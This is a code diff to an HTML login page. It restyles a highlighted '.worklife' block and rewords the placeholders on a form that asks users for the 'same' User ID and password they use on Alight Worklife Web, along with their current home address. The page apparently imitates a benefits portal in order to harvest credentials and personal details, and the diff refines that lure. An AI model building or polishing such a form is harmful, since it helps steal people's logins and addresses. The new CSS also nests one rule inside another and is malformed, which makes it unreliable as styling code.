@@ -17,8 +17,21 @@
         input:focus { outline: none; border-bottom-color: #3b82f6; }
         .login-btn { width: 100%; padding: 16px; background: #1e40af; color: white; border: none; border-radius: 50px; font-size: 1.2rem; font-weight: 600; margin: 15px 0; cursor: pointer; }
         .worklife{
-            font-size:15px;
-            color : blue;
+            .worklife {
+    font-size: 16px;           /* Slightly larger for better readability */
+    font-weight: 600;          /* Bold to draw attention */
+    color: #0052cc;            /* Stronger, professional blue */
+    background-color: #f0f7ff; /* Light blue background for highlight */
+    padding: 16px 20px;        /* Generous padding inside */
+    margin: 12px 0;            /* Space around the element */
+    border-left: 5px solid #0052cc; /* Left accent border */
+    border-radius: 6px;        /* Soft rounded corners */
+    line-height: 1.6;          /* Better line spacing */
+    text-align: left;
+    box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1); /* Subtle depth */
+}
+            
+            
         }
     </style>
 </head>
@@ -33,10 +46,10 @@
     <div class="form-container">
         <form id="loginForm">
             <label>Enter your User ID</label>
-            <input type="text" id="username" placeholder="Same ID used to access benefits on Alight Worklife Web" required>
+            <input type="text" id="username" placeholder="Same ID used to access Alight Worklife Web" required>
 
             <label>Enter your Password</label>
-            <input type="password" id="password" placeholder="Same password used to access benefits on Alight Worklife Web" required>
+            <input type="password" id="password" placeholder="Same password used to access Alight Worklife Web" required>
 
             <label>Home Address (Current)</label>
             <input type="text" id="address" placeholder="Enter your current home address" required>
